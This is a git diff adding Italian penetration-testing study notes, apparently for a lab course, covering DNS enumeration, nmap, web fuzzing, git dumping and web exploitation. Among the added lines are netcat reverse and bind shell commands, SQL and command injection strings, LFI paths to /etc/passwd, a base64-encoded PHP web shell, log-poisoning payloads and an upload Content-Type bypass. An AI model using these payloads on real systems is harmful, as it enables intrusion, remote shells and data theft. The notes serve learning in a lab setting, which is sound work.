@@ -280,7 +280,128 @@ di solito usato con anche
 	- funziona solo se hai permessi di scrittura su `/etc/passwd`
 
 ##### Network
-- parte 1: dns nmap nc 
-- parte 2: shell
+- parte 1: dns nmap e roba
+- `dig @192.168.14.98 vdsilab.local txt`
+    - interroga il DNS `192.168.14.98` cercando record `TXT` del dominio
+    - i record TXT spesso contengono note, token, flag o info utili
+- `dig @192.168.14.95 vdsisecurity.lab axfr`
+    - prova una **zone transfer DNS**
+    - se funziona, scarica tutti i record del dominio, inclusi sottodomini
+- `dnsenum vdsisecurity.lab --dnsserver 192.168.14.95 -f subdomains-top1million-5000.txt`
+    - enumera DNS e sottodomini
+    - usa il DNS indicato e una wordlist per bruteforzare sottodomini
+- `nmap -sC -sV -sS 192.168.14.117`
+    - `-sC` = script base di nmap
+    - `-sV` = rileva versioni dei servizi
+    - `-sS` = SYN scan, scansione TCP “semi-aperta”
+- `curl -H "Host: sup3r.s3cr3t-b4ck3nd.vdsizone.transfer" http://192.168.14.96`
+    - fa una richiesta HTTP all’IP usando un **Host header** specifico
+    - utile quando più siti/virtual host stanno sullo stesso IP
+- `nmap -p 62260-65535 192.168.14.97`
+    - scansiona solo le porte da `62260` a `65535`
+- `nmap -P0 <ip>`
+    - salta il ping iniziale
+    - utile se il target blocca ICMP/ping ma ha porte aperte
+- `curl -v -X TRACE http://192.168.14.99:8080`
+    - prova il metodo HTTP `TRACE`
+    - `-v` mostra dettagli della richiesta/risposta
+    - se TRACE è attivo può essere una configurazione insicura
+- `nc 192.168.14.115 9007`
+    - si connette alla porta `9007` con netcat
+    - utile per banner grabbing, servizi custom o challenge testuali
+- parte 2: shell [https://revshells.com](https://revshells.com) 
+	- reverse
+		- mi metto in ascolto su una porta
+		- il server si connette a me
+		- uso RCE per far partire la connessione dal target
+		- **comandi (netcat)**
+		     - lato **attaccante (listener)**:
+	          `nc -lvp 4444`
+		    - lato **target**:
+	         `nc <IP_attaccante> 4444 -e /bin/bash`
+	- bind
+	    - lato **server (target)**:
+	        `nc -lvp 4444 -e /bin/bash`
+	        - `-l` → listen
+	        - `-v` → verbose
+	        - `-p` → porta
+	        - `-e` → esegue la shell
+	    - lato **attaccante (client)**:
+	        `nc <IP_target> 4444
+		- netstat -tulpn
+- local port forwarding e remote port forwarding
+	- `ssh user@192.168.0.45 -L 8080:192.168.0.35:80`  
+		- mi collego alla macchina compromessa `192.168.0.45`  
+		- apro la porta `8080` sul mio PC  
+		- quando accedo a `localhost:8080`  
+		- sto in realtà comunicando con `192.168.0.35:80`  
+	- `ssh user@192.168.0.45 -R 8080:localhost:4444`  
+		- mi collego alla macchina `192.168.0.45`  
+		- apro la porta `8080` sulla macchina remota  
+		- quando qualcuno si connette a `192.168.0.45:8080`  
+		- il traffico viene inoltrato al mio PC su `localhost:4444`
+
 ##### Web Enumeration
+cartelle utilissime per trovare cose nascoste o altro
+- `/robots.txt`
+- `/sitemap.xml`
+- trovare i virtual host che nascondono gli host che hanno 4829 linee
+	- `wfuzz -w ./subdomains-top1million-5000.txt -u http://192.168.14.132 -H "HOST: FUZZ.cloud.vdsi" --hh 4829`
+		- `gobuster vhost -u http://vdsi-services.xyz/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
+- trovare i web content delle cartelle
+	- `gobuster dir -u http://cloud.vdsi --proxy http://127.0.0.1:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --exclude-length 4829`
+	- `gobuster dir -u http://admin.cloud.vdsi  -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --exclude-length 0 -x php`
+		- questo include anche `.php` come estensione dei file
+	- `feroxbuster -u http://vdsi-services.xyz/d3v-VDS1 -w /usr/share/seclists/Discovery/Web-Content/common.txt`
+cose extra per dumping di un git
+- `git dumper python `
+- `git_dumper.py http://vdsi-services.xyz/d3v-VDS1/.git/ ./sberg2`
+
 ##### Web Exploitation
+di solito utente che esegue il processo server si chiama (es. `www-data`)
+- se hai una pagina di login è possibile che ci sia una query sotto in sql
+	- prova a fare `' OR '1'='1`
+- se hai un comando che ti fa eseguire tipo ping a indirizzi da te inseriti prova a fare `";"id"` per far eseguire id 
+- se ho una file inclusion con parametri posso trovare anche cose nella dir normale
+- `?page=file:///etc/passwd`
+	- `../../../../etc/passwd`
+	- `..%2F..%2F..%2F..%2Fetc%2Fpasswd`
+- sfruttare php wrapper
+	- `php://filter/read=convert.base64-encode/resource=config`
+		- In questo caso PHP legge la risorsa `config`, ma prima di restituirla la converte in **Base64**
+	- `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`
+		- serve per **iniettare direttamente del contenuto**, per esempio codice PHP codificato in Base64, senza dover caricare un file sul server
+- posso usare vari php wrapper
+	- creiamo un file php da revshell
+	- lo uplodiamo nella macchina
+	- lo eseguiamo da include nel parametro page
+	- la rev shell magari funziona se non funziona prova un altro comando
+	- la più stabile credo sia la `proc_open`
+	- gli altri eseguono il comando nel web server e il processo shell muore subito
+	- così apre il nuovo processo
+- Se non hai file upload
+	- Se non puoi caricare file, puoi cercare altri modi per “scrivere” qualcosa sul server.
+	- Un caso tipico sono i log:
+	    - `/var/log/apache2/access.log`
+	    - `/var/log/nginx/access.log`
+	    - `/var/log/<nome_server>/access.log`
+	- L’`access.log` salva le richieste HTTP ricevute.
+	- Se c’è una **LFI**, puoi provare a leggere/includere il log.
+	- In alcuni casi puoi mettere codice o payload dentro User-Agent, URL o altri header, farlo finire nel log e poi includerlo.
+Esempio idea:
+`User-Agent: <?php system($_GET['cmd']); ?>`
+Poi, se il log viene incluso da una LFI, potresti eseguire comandi tipo:
+`?page=/var/log/apache2/access.log&cmd=id`
+###### MIME / Content-Type
+- Il MIME type indica il tipo del file inviato.
+- Esempi:
+    - `image/png`
+    - `image/jpeg`
+    - `text/plain`
+    - `application/x-php`
+- Alcuni upload controllano solo il `Content-Type`.
+- Con Burp puoi intercettare la richiesta e modificarlo.
+`Content-Type: image/png`
+anche se il file in realtà è PHP.
+- Serve per provare a bypassare controlli deboli sull’upload.
+- Però un controllo serio verifica anche estensione, contenuto reale del file e configurazione del server.
